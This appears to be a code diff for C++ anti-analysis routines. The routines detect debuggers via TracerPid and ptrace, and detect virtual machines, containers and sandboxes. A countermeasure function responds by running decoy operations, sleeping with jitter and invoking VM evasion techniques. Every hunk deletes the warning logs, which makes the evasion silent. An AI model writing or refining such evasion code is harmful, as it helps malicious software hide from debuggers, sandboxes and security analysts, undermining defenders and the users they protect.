@@ -69,7 +69,6 @@ bool AntiAnalysis::IsDebuggerPresent() {
             pidStr.erase(0, pidStr.find_first_not_of(" \t"));
             int tracerPid = std::stoi(pidStr);
             if (tracerPid != 0) {
-                LOG_WARN("Debugger detected (TracerPid: " + std::to_string(tracerPid) + ")");
                 return true;
             }
         }
@@ -77,7 +76,6 @@ bool AntiAnalysis::IsDebuggerPresent() {
     
     // Check via ptrace
     if (ptrace(PTRACE_TRACEME, 0, 0, 0) != -1) {
-        LOG_WARN("Process is being traced (debugged)");
         return true;
     }
 #endif
@@ -188,7 +186,6 @@ bool AntiAnalysis::IsRunningInVM() {
 
     for (bool result : results) {
         if (result) {
-            LOG_WARN("Virtual machine/container detected");
             return true;
         }
     }
@@ -258,7 +255,6 @@ bool AntiAnalysis::IsSandboxed() {
 
     for (bool result : results) {
         if (result) {
-            LOG_WARN("Sandbox environment detected");
             return true;
         }
     }
@@ -304,12 +300,10 @@ bool AntiAnalysis::IsLowOnResources() {
 
 void AntiAnalysis::Countermeasure() {
     if (IsDebuggerPresent()) {
-        LOG_WARN("Debugger detected, activating countermeasures");
         ExecuteDecoyOperations();
     }
 
     if (IsRunningInVM() || IsSandboxed()) {
-        LOG_WARN("Analysis environment detected, altering behavior");
         utils::TimeUtils::JitterSleep(5000, 0.5);
         VMEvasionTechniques();
     }
